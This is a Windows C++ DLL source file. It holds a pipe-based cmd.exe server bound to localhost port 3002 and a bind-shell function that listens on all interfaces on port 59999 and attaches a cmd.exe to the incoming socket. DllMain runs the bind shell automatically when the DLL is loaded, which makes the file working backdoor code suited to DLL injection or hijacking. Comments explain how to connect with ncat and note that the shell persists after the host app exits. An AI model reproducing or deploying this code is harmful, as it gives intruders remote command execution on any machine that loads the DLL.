// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
// ConsoleApplication2.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <tchar.h>
#include <strsafe.h>
#include <WinSock2.h>
#include <windows.h>
#include <stdlib.h>

#ifndef _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Ws2tcpip.h> // We will use this for InetPton()
#endif

#pragma comment (lib, "Ws2_32.lib")

/* Typedefs */
typedef HANDLE PIPE;

typedef struct
{
	SOCKET client;

	PIPE hProcRead;
	PIPE hProcWrite;

	CHAR chProcBuff[1024];
	CHAR chSockBuff[1024];

	DWORD dwProcRead;
	DWORD dwSockRead;

	HANDLE hThread;
	HANDLE hProcess;
	BOOL bRunning;
} ClientState, * PClientState;


/* Declarations */
void ErrorExit(const TCHAR* lpszFunction);
BOOL ReadFromSocket(ClientState* state);
BOOL OnProcessOutput(ClientState* state);
BOOL OnSocketOutput(ClientState* state);
void CleanUp(ClientState* state);

/* Global Variables */
HANDLE g_hReadProcThread;

BOOL OnProcessOutput(ClientState* state)
{
	if (state == NULL)
	{
		ErrorExit(_T("null state pointer"));
		return FALSE;
	}

	if (!state->bRunning)
		return FALSE;

	DWORD sent = 0;
	while (sent < state->dwProcRead && (int)sent != SOCKET_ERROR)
	{
		sent += send(state->client, state->chProcBuff + sent, state->dwProcRead - sent, 0);
		if ((int)sent == SOCKET_ERROR)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL OnSocketOutput(ClientState* state)
{
	if (state == NULL)
		ErrorExit(_T("null state pointer"));

	if (!state->bRunning)
		return FALSE;

	DWORD dwWrite, dwTotalWritten = 0;
	BOOL bSuccess = FALSE;

	while (dwTotalWritten < state->dwSockRead)
	{
		bSuccess = WriteFile(state->hProcWrite, state->chSockBuff + dwTotalWritten, state->dwSockRead - dwTotalWritten,
			&dwWrite, NULL);
		if (!bSuccess)
		{
			shutdown(state->client, SD_BOTH);
			closesocket(state->client);
			return FALSE;
		}
		dwTotalWritten += dwWrite;
	}

#ifdef _CONSOLE
	const HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	dwTotalWritten = 0;

	if (hStdOut != INVALID_HANDLE_VALUE)
	{
		while (dwTotalWritten < state->dwSockRead)
		{
			bSuccess = WriteFile(hStdOut, state->chSockBuff + dwTotalWritten, state->dwSockRead - dwTotalWritten,
				&dwWrite, NULL);
			if (!bSuccess)break;
			dwTotalWritten += dwWrite;
		}
	}
#endif


	return TRUE;
}

DWORD WINAPI ReadFromProcess(ClientState* state)
{
	DWORD dwWritten;

	BOOL bSuccess = FALSE;

	while (state->bRunning)
	{
		bSuccess = ReadFile(state->hProcRead, state->chProcBuff, 1024, &state->dwProcRead, NULL);
		if (!bSuccess || state->dwProcRead == 0) break;

		OnProcessOutput(state);
		if (!bSuccess) break;

		state->chProcBuff[strlen("exit")] = '\0';
		if (_strcmpi(state->chProcBuff, "exit") == 0)
		{
			state->bRunning = FALSE;
			shutdown(state->client, SD_BOTH);
			closesocket(state->client);
			return 0;
		}
	}

	return 0;
}

BOOL StartProcessAsync(ClientState* state)
{
	//Process Setup
	SECURITY_ATTRIBUTES secAttrs;
	STARTUPINFO sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };
	PIPE hProcInRead, hProcInWrite, hProcOutRead, hProcOutWrite;
	TCHAR cmdPath[MAX_PATH] = TEXT("C:\\Windows\\System32\\cmd.exe");

	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;


	if (!CreatePipe(&hProcInRead, &hProcInWrite, &secAttrs, 0))
		ErrorExit(TEXT("hProcIn CreatePipe"));

	// Ensure the write handle to the pipe for STDIN is not inherited. 
	// The Child Process does not have to be able
	// to WRITE to input, it only needs to READ from the input.
	if (!SetHandleInformation(hProcInWrite, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("StdIn SetHandleInformation"));

	if (!CreatePipe(&hProcOutRead, &hProcOutWrite, &secAttrs, 0))
		ErrorExit(TEXT("hProcOut CreatePipe"));

	// Ensure the write handle to the pipe for STDOUT is not inherited.
	// The Child Process does not have to be able
	// to READ from output, it only needs to WRITE to the output.
	if (!SetHandleInformation(hProcOutRead, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("StdIn SetHandleInformation"));

	//GetEnvironmentVariable(_T("ComSpec"), cmdPath, sizeof(cmdPath));

	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.wShowWindow = SW_HIDE;

	// Setup Redirection
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	sInfo.hStdInput = hProcInRead;
	// process will be writing output into the writing side of the pipe we will be reading from using the reading side.
	sInfo.hStdOutput = hProcOutWrite;
	// process will be writing errors into the writing side of the pipe we will be reading from using the reading side.
	sInfo.hStdError = hProcOutWrite;

	CreateProcess(NULL,
		cmdPath,
		&secAttrs,
		&secAttrs,
		TRUE, // Inherit Handles(Including PIPES)
		0,
		NULL,
		NULL,
		&sInfo, &pInfo);

	state->hProcRead = hProcOutRead;
	state->hProcWrite = hProcInWrite;
	state->hThread = pInfo.hThread;
	state->hProcess = pInfo.hProcess;

	g_hReadProcThread = CreateThread(&secAttrs, 0,
		(LPTHREAD_START_ROUTINE)ReadFromProcess,
		state, 0, NULL);

	return TRUE;
}

int main()
{
	//Socket Setup
	SOCKADDR_IN server;
	SOCKET sockServer;
	WSADATA wsaData;

	int iResult;
	const unsigned short port = 3002;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		int err = WSAGetLastError();
		ErrorExit(_T("Error on WSAStartup"));
	}

	server.sin_family = AF_INET;
#ifdef _WINSOCK_DEPRECATED_NO_WARNINGS
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
#else
	InetPton(AF_INET, _T("127.0.0.1"), &server.sin_addr.s_addr);
	// InetPton(AF_INET, _T("0.0.0.0"), &server.sin_addr.s_addr); // Bind to all interfaces
#endif

	server.sin_port = htons(port);
	sockServer = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if ((int)sockServer == SOCKET_ERROR)
	{
		ErrorExit(_T("Error on socket()"));
	}

	int yes = 1;
	SOCKADDR_IN client;
	int sockaddr_len = sizeof(SOCKADDR_IN);
	setsockopt(sockServer, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
	bind(sockServer, (SOCKADDR*)&server, sockaddr_len);
	listen(sockServer, 0);

	const SOCKET sockClient = accept(sockServer, (SOCKADDR*)&client, &sockaddr_len);

	if ((int)sockClient == SOCKET_ERROR)
		return 1;


	ClientState* state = (ClientState*)malloc(sizeof(ClientState));

	state->bRunning = TRUE;
	state->client = sockClient;

	StartProcessAsync(state);
	ReadFromSocket(state);


	CloseHandle(state->hProcRead);
	CloseHandle(state->hProcWrite);
	CloseHandle(state->hThread);
	CloseHandle(state->hProcess);
	// TerminateProcess(state->hProcess, 0);

	shutdown(sockClient, SD_BOTH);
	shutdown(sockServer, SD_BOTH);
	closesocket(sockClient);
	closesocket(sockServer);

	WaitForSingleObject(g_hReadProcThread, INFINITE);
	return 0;
}


BOOL ReadFromSocket(ClientState* state)
{
	while (state->bRunning)
	{
		state->dwSockRead = recv(state->client, state->chSockBuff, 1024, 0);
		if ((int)state->dwSockRead == SOCKET_ERROR)
		{
			state->bRunning = FALSE;
			return FALSE;
		}

		OnSocketOutput(state);
	}
	return TRUE;
}

void ErrorExit(const TCHAR* lpszFunction)

// Format a readable error message, display a message box, 
// and exit from the application.
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(
			TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(1);
}



int BindS() {
	// To test this you can ncat -v 127.0.0.1 3002
	WSADATA wsa;
	struct sockaddr_in address;
	STARTUPINFO sui = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	int result = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (result != 0)
		return EXIT_FAILURE;

	// const SOCKET server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	// WSASocketW works, socket() won't
	const SOCKET server_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,
		(unsigned int)NULL);

	if (server_socket == INVALID_SOCKET)
	{
		WSACleanup();
		return EXIT_FAILURE;
	}

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	// If you have an actual address then use, i.e 127.0.0.1:
	// InetPton(AF_INET, _T("127.0.0.1"), &address.sin_addr.s_addr);

	address.sin_port = htons(59999);

	result = bind(server_socket, (struct sockaddr*)&address, sizeof(SOCKADDR));

	if (result == SOCKET_ERROR)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	result = listen(server_socket, SOMAXCONN);
	if (result == SOCKET_ERROR)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	ADDRINFO client_address;
	int client_address_len = sizeof(struct sockaddr_in);

	const SOCKET client_socket = accept(server_socket, (SOCKADDR*)&client_address, &client_address_len);
	if (client_socket == INVALID_SOCKET)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	// sui.wShowWindow = SW_HIDE; // Not needed
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = (HANDLE)client_socket;
	sui.hStdOutput = (HANDLE)client_socket;
	sui.hStdError = (HANDLE)client_socket;

	TCHAR cmd[] = _T("cmd.exe");
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE,
		CREATE_NEW_CONSOLE, NULL, NULL, &sui, &pi))
	{
		return EXIT_FAILURE;
	}

	// If you don't want to exit this app then you can wait the cmd to finish
		// but this is not needed, even if this app exits, the shell will be still opened on the client
		// WaitForSingleObject(pi.hProcess, INFINITE);
	// It does not matter to close the socket handles, the shell will be still available on the client
	closesocket(server_socket);
	closesocket(client_socket);
	return EXIT_SUCCESS;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		BindS();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

